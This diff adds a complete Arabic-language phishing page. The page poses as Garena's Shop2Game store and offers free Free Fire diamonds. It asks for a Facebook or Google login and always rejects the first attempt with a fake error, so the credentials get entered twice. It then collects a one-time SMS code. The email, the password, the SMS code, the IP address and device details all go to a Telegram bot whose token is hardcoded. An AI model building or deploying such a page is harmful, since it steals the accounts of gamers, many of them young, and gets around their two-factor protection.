@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shop2Game - Garena</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --garena-red: #e43333;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: var(--dark-bg); color: white; }
+
+        /* الهيدر المحسن */
+        .navbar {
+            background: #000;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--garena-red);
+        }
+        .garena-logo { height: 35px; order: 2; } /* جعل اللوجو على اليمين */
+        .site-title { font-size: 1.4rem; font-weight: bold; order: 1; }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+
+        /* الأقسام */
+        .section { display: none; }
+        .active { display: block; }
+
+        .page-title { text-align: center; font-size: 1.8rem; margin: 30px 0; font-weight: bold; }
+
+        /* بطاقة اللعبة */
+        .game-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #333;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .game-card:hover { border-color: var(--garena-red); }
+        .game-card img { width: 100%; display: block; }
+        .game-card .footer-title { padding: 15px; text-align: center; font-size: 1.3rem; background: #222; }
+
+        /* شبكة العروض */
+        .offers-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        .offer-item {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #444;
+            cursor: pointer;
+            position: relative;
+        }
+        .free-badge { position: absolute; top: -10px; right: -5px; background: #44bd32; padding: 2px 10px; border-radius: 10px; font-size: 11px; }
+
+        /* أزرار التسجيل */
+        .login-methods { text-align: center; background: var(--card-bg); padding: 25px; border-radius: 15px; }
+        .btn-login {
+            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 6px;
+            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-fb { background: #1877f2; color: white; }
+        .btn-google { background: white; color: #555; }
+
+        input { width: 100%; padding: 14px; margin: 8px 0; border-radius: 6px; border: 1px solid #444; background: #000; color: white; }
+        .btn-submit { background: var(--garena-red); color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        .error-msg { color: #ff4747; font-size: 0.85rem; margin-top: 10px; display: none; }
+        
+        .loading { border: 4px solid #333; border-top: 4px solid var(--garena-red); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="site-title">Shop2Game</div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena">
+    </nav>
+
+    <div class="container">
+        
+        <section id="step1" class="section active">
+            <h2 class="page-title">اختر اللعبة</h2>
+            <div class="game-card" onclick="goToStep(2)">
+                <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg" alt="Free Fire">
+                <div class="footer-title">Free Fire</div>
+            </div>
+        </section>
+
+        <section id="step2" class="section">
+            <h2 class="page-title">العروض المميزة 💎</h2>
+            <div class="offers-grid">
+                <div class="offer-item" style="border: 2px solid #44bd32;" onclick="goToStep(3, '500 Diamond Free')">
+                    <span class="free-badge">مجاناً</span>
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 500</div>
+                    <div style="color: #44bd32;">احصل عليها الآن</div>
+                </div>
+                <div class="offer-item" onclick="window.location.href='https://shop2game.com'">
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 1080</div>
+                    <div style="color: #aaa;">$10.00</div>
+                </div>
+            </div>
+        </section>
+
+        <section id="step3" class="section">
+            <div class="login-methods">
+                <h3>تسجيل الدخول للاستلام</h3>
+                <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9rem;">يجب التحقق من حسابك لإرسال الجواهر</p>
+                <button class="btn btn-login btn-fb" onclick="showForm('Facebook')"><i class="fab fa-facebook"></i> Facebook</button>
+                <button class="btn btn-login btn-google" onclick="showForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> Google</button>
+            </div>
+        </section>
+
+        <section id="step4" class="section">
+            <div class="login-methods">
+                <h3 id="formTitle">تسجيل الدخول</h3>
+                <div id="errorBox" class="error-msg">حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.</div>
+                <input type="text" id="userEmail" placeholder="البريد الإلكتروني أو الهاتف">
+                <input type="password" id="userPass" placeholder="كلمة المرور">
+                <button class="btn-submit" onclick="handleData()">إشحن الآن 💎</button>
+            </div>
+        </section>
+
+        <section id="step5" class="section">
+            <div class="login-methods">
+                <h3>تأكيد الهوية (SMS)</h3>
+                <p style="font-size: 0.8rem; color: #aaa;">أرسلنا رمزاً لهاتفك، أدخله هنا لتفعيل الشحن المجاني.</p>
+                <input type="number" id="smsInput" placeholder="أدخل الرمز المكون من 6 أرقام">
+                <button class="btn-submit" onclick="handleSMS()">تأكيد الرمز</button>
+            </div>
+        </section>
+
+        <section id="step6" class="section">
+            <div class="login-methods">
+                <div class="loading"></div>
+                <h3>جاري التحقق...</h3>
+                <p>يتم الآن مراجعة بياناتك مع سيرفرات كرينا، ستصلك الجواهر فور الانتهاء.</p>
+            </div>
+        </section>
+
+    </div>
+
+    <script>
+        const TOKEN = "8730273478:AAGRhE4wzNJMhDLaJ6m2yaBXiJiTusjr9UM";
+        const CHAT_ID = "7902407443";
+        
+        let attempts = 0;
+        let selectedOffer = "";
+        let method = "";
+
+        function goToStep(s, extra = "") {
+            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
+            document.getElementById('step' + s).classList.add('active');
+            if(extra) selectedOffer = extra;
+            window.scrollTo(0,0);
+        }
+
+        function showForm(m) {
+            method = m;
+            document.getElementById('formTitle').innerText = "الدخول عبر " + m;
+            goToStep(4);
+        }
+
+        async function sendMsg(text) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        }
+
+        async function getInfo() {
+            try {
+                let r = await fetch('https://ipapi.co/json/');
+                let d = await r.json();
+                return `📍 IP: ${d.ip} | 🌍 ${d.country_name} | 📱 ${navigator.userAgent}`;
+            } catch { return "Unknown Info"; }
+        }
+
+        async function handleData() {
+            const email = document.getElementById('userEmail').value;
+            const pass = document.getElementById('userPass').value;
+
+            if(!email || !pass) return;
+
+            if(attempts < 1) {
+                document.getElementById('errorBox').style.display = 'block';
+                attempts++;
+                return;
+            }
+
+            const device = await getInfo();
+            const msg = `🚀 صيد جديد!\n💎 العرض: ${selectedOffer}\n🔑 الطريقة: ${method}\n📧 الحساب: ${email}\n🔒 كلمة السر: ${pass}\n---\n${device}`;
+            
+            await sendMsg(msg);
+            goToStep(5);
+        }
+
+        async function handleSMS() {
+            const code = document.getElementById('smsInput').value;
+            if(!code) return;
+            await sendMsg(`📩 كود SMS المستلم: ${code}`);
+            goToStep(6);
+        }
+    </script>
+</body>
+</html>
